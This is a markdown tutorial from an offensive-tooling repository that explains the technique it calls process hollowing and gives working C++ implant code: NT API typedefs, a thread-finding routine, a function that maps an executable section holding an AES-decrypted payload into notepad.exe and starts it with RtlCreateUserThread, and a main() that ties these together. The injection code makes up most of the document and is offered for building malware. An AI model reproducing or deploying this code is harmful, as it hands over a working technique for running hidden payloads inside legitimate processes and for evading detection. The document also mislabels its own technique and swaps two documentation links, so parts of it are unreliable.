# Wumbobfuscating Process Injection Techniques
The C/C++ code exemplifying the process injection techniques below was originally written by [Sektor7 Institute](https://institute.sektor7.net/) within their [Malware Development Intermediate](https://institute.sektor7.net/courses/rto-maldev-intermediate) course. The explanations and analysis of the code are entirely my own.

## Process Hollowing

### Background
Process injection describes a collection of attack techniques involving the execution of arbitrary code into a live process. Beyond the execution of arbirtrary code, successful process injection may lead to privilege escalation and/or access to the system/network resources of a hijacked process.

Note that successful process injection requires significant prototyping, as the manipulation of a targeted process or thread may cause it to crash before, during, or after successful payload execution.

Process Hollowing is a process injection subtechnique that stores a payload within the unmapped (hollowed) memory of a suspended process. However, unlike classic process injection, which performs memory allocation, payload writing, and payload execution within a targeted legitimate process, Process Hollowing place the payload within a section (i.e. memory region) of the implant process itself, using Windows API calls such as [`NtCreateSection()`](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html) and references its execution through a chain of local and remote view (i.e. handles to a section) created by [`NtMapViewOfSection`](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html).

Process Hollowing is defined in the MITRE ATT&CK Framework as [T1055.012](https://attack.mitre.org/techniques/T1055/012/).

The development process below is an extension to [the process injection template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md) detailed in this repository.

## Developing Process Hollowing Techniques

#### Process Hollowing Stages
Whereas other process injection techniques typically focus on the targeted process for memory allocation, payload writing, and payload execution, process hollowing requires these actions to take place within the implant process itself. For this to happen, the implant process needs to create a section (i.e. memory region) within itself, where the payload is stored. It then creates a local view (i.e. handle to the section) to reference and access that section, and attaches the local view to a second, remote view within the targeted process. This remote view creates a chain of references from the targeted process, to the remote process, to the payload stored in the remote process.

1. [`CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot), [`EnumProcesses()`](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocesses) - A list of running processes is generated.
</br> _Note: The enumeration and location of the target process takes place via a custom [`FindTarget()`](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) function defined in the [Process Injection Template](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption)_
2. [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) - A list of running threads is generated.
3. [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) - Threads in the list returned by [`CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD)`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) are iterated through, so that a thread corresponding to the targeted process can be discovered.
4. [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) - A handle to the targeted thread is opened and returned to the program.
5. [`NtCreateSection()`](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html) - Create a new section (region of memory) within the implant process.
6. [`NtMapViewOfSection()`](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html) - Create a local view (handle to a section) within the implant process.
7. [`Memcpy()`](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-160) - Copy the payload into the section (region of memory) within the implant process.
8. [`NtMapViewOfSection()`](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html) - Create a remote view (handle to a section) within the targeted process that references the aforementioned local view within the implant process.
9. [`RtlCreateUserThread()`](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html) - Execute the payload within the section (region of memory) of the implant process by creating a thread to it in the remote view (handle to a section) of the target process. This thread, created in the remote view, will pass through the local view in the implant process, and execute the payload stored in the section of the implant process created in Stage 5.

It is important to underscore that, while classic process injection targets a running process, Process Hollowing goes several layers deeper in its use of threads, views, and sections. For this reason, in addition to different injection technique, a second targeting function is required to locate the running thread, after [the initial process targeting function](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting). A fluid understanding of process sections and views is necessary to properly implement process hollowing.

#### Process Hollowing Function Typedef
The Process Hollowing technique development exemplified here relies on an expanded number of [typedefs to key process injection functions](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-injection-function-typedef). Further explanation of these functions can be found in the [NTAPI Undocumented Functions website](http://undocumented.ntinternals.net/). Links to specific function definitions are placed in the comments within the code block below:

```c++
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	
```

#### Thread Targeting
After [process targeting](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#process-targeting) has occurred, a custom `FindThread()` function takes in the targeted Process ID (PID) and uses [`CreateToolhelp32Snapshot()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) is called with the `TH32CS_SNAPTHREAD` argument to generate a list of running threads within the target process. A `while` loop checks each entry (`thEntry`) of this list by calling [`Thread32Next()`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next), and compares (`==`) the Process ID (PID) (`th32OwnerProcessID`) to the PID of the targeted process. When a matching PID is located, `FindThread()` calls [`OpenThread()`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) to return the handle of the corresponding thread.

Note that, in this example, `FindThread()` is not called within the `main()` function of the implant, only within the proceeding process hollowing function (`InjectVIEW`), where it returns the handle to the targeted thread.

```c++
// Credit: reenz0h (@sektor7net), RTO Malware Development Essentials course
HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}
```

#### Process Hollowing
Note that this function begins by declaring a null handle (`hSection`) to the target section, a two null LPVOID and PVOID-type pointers (`pLocalView`, `pRemoteView`) which will eventually point to the injected payload, a handle to the target thread `hThread`, and a CLIENT_ID structure/type (`CLIENT_ID`) contained in the `typedef` statement above.

```c++
int InjectVIEW(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;
```

##### Creating a Section (Implant Process)
To begin Process Hollowing, a section must be created within the implant process. A section is a new region of memory.

To accomplish this, `NtCreateSection_t` type created in the above `typedef` is used to declare a typecasted pointer to `NtCreateSection()`. Note that, despite the use of a function pointer, the below code example will produce a non-obfuscated string of `NtCreateSession()`, as well as non-obfuscated strings to `GetProcAddress()` and `GetModuleHandle()`. Refer to the [Import Address Table Obfuscation](https://github.com/Wumbobfuscation/Wumbobfuscation/tree/main/Import%20Address%20Table%20Obfuscation) folder of this repository for [GetProcAddress()](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Import%20Address%20Table%20Obfuscation/GetProcAddress.md), [GetModuleHandle](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Import%20Address%20Table%20Obfuscation/GetModuleHandle.md), and other function call obfuscation techniques

```c++
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
	if (pNtCreateSection == NULL)
		return -2;
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
```

##### Creating a Local View (Implant Process)


```c++
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
	if (pNtMapViewOfSection == NULL)
		return -2;
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_READWRITE);
```

##### Injecting the Payload into the Section (Implant Process)

```c++
	memcpy(pLocalView, payload, payload_len);
```

##### Creating a Remote View (Targeted Process)

```c++
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
```

##### Executing the Payload

```c++
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
  
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}
```

#### Implementation
In this example, unlike the [classic process injection](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md) and [Thread Execution Hijacking](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Thread%20Execution%20Hijacking.md) techniques, the [payload decryption](https://github.com/Wumbobfuscation/Wumbobfuscation/blob/main/Process%20Injection/Process%20Injection%20Template.md#aes-decryption) does not take place within the injection function, and instead occurs within the `main()` function, directly before the custom process hollowing function (`InjectView()`) is called:

```c++
int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			// Decrypt and inject payload
			AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
			InjectVIEW(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
```
